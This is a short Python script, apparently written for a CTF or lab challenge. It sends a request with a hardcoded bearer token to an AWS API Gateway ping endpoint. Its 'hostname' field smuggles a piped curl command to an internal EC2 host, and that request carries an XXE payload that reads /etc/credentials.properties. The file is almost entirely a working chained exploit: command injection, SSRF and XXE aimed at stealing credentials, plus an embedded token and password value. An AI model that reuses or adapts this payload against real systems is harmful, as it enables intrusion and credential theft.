import requests


token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzdGlua3lmaXNoIiwibmFtZSI6InN0IW5reSIsImlhdCI6MTU1MTc4MzAwOH0.I97GwWb5eM7Qe0xQtDaKLCtrq4C5aXfHy9RFXuvz40c"
headers = {"Authorization": "Bearer "+token, "accept-encoding":"gzip, deflate, br", "accept-language":"en-US,en;q=0.9,ja-JP;q=0.8,ja;q=0.7,zh-TW;q=0.6,zh;q=0.5", "user-agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36", "accept":"application/json, text/plain, */*", "referer":"https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/foobarcampaign-messages/cncChat.html", "authority":"k7vo268tif.execute-api.us-east-1.amazonaws.com","Content-Type":"application/json"}

#payload
payload_01 = {"hostname":"google.com | curl 'http://ip-172-31-31-95.ec2.internal:8080/commandproc/login.jsp' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"document\"\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:////etc/credentials.properties\">]><credentials><user>aaa</user><password>7XIBXvzrWjOq8E5LnkBslZhKjLc+CG3HC5mJaj+Q13ATK0AYvf0ZrhkYVTcbYfFr</password></credentials>\r\n------123--\r\n' -i -L"}


def rockman():
	r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_01, headers=headers)
	print(r.status_code)
	print(r.text)

if __name__=="__main__":
	rockman()